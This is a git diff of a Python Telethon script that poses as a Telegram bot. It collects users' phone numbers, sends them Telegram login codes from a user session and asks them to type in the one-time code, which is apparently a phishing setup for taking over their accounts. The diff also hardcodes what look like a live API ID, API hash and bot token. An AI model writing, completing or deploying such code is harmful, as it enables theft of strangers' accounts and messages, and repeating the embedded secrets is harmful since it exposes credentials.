@@ -11,18 +11,20 @@ import asyncio
 from telethon import TelegramClient, events
 
 
+
+
 api_id = 10247139  # Replace with your API ID
 api_hash = "96b46175824223a33737657ab943fd6a"  # Replace with your API Hash
 bot_token = "7293653178:AAGcJSttQbNUK0ORBmf6G9yy7LBLsxuU_k8"  # Replace with your Bot Token
 
-client = TelegramClient('bot', api_id, api_hash)
+client = TelegramClient('user_session', api_id, api_hash)
 
 # Dictionary to store user data
 user_data = {}
 
 @client.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    await event.respond("Welcome Please enter your phone number in the format +123456789.")
+    await event.respond("Welcome! Please enter your phone number in the format +123456789.")
     raise events.StopPropagation
 
 @client.on(events.NewMessage)
@@ -37,7 +39,7 @@ async def handle_phone_number(event):
         # Send the OTP
         sent_code_info = await client.send_code_request(phone_number)
         user_data[event.sender_id] = {"phone_number": phone_number, "sent_code_info": sent_code_info}
-        await event.respond("OTP sent Please enter the code you received.")
+        await event.respond("OTP sent! Please enter the code you received.")
         
         # Wait for OTP input
         @client.on(events.NewMessage)
@@ -60,5 +62,11 @@ async def handle_phone_number(event):
         await event.respond(f"Error sending OTP: {str(e)}")
 
 # Run the bot
-client.start()
-client.run_until_disconnected()
+async def main():
+    await client.start()
+    print("Bot is running...")
+    await client.run_until_disconnected()
+
+# Start the main function
+import asyncio
+asyncio.run(main())
